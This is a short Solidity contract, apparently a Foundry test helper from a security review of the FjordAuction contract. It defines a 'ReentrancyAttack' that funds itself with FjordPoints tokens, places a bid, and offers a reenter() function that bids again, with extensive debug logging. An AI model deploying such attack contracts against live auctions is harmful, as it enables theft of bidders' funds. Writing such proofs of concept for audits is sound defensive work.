// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.21;

import { FjordAuction } from "../../src/FjordAuction.sol";
import { IERC20 } from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "forge-std/console.sol"; // Add console log

contract ReentrancyAttack {
    FjordAuction public auction;
    IERC20 public fjordPoints;
    uint256 public amount;

    constructor(FjordAuction _auction, IERC20 _fjordPoints) {
        auction = _auction;
        fjordPoints = _fjordPoints;
    }

    function attack(uint256 _amount) external {
        console.log("Attacking with amount:");
        console.log(_amount); // Add logging

        amount = _amount;

        // Try-catch to debug potential transferFrom issue
        try fjordPoints.transferFrom(msg.sender, address(this), amount) {
            console.log("transfer succeeded");
        } catch Error(string memory reason) {
            console.log("transferFrom failed. Reason:");
            console.log(reason);
            revert("transferFrom failed");
        } catch (bytes memory reason) {
            console.log("transferFrom failed. Reason in bytes:");
            console.logBytes(reason);
            revert("transferFrom failed");
        }

        fjordPoints.approve(address(auction), amount);
        auction.bid(amount);
    }

    function reenter() external {
        auction.bid(amount);
    }
}
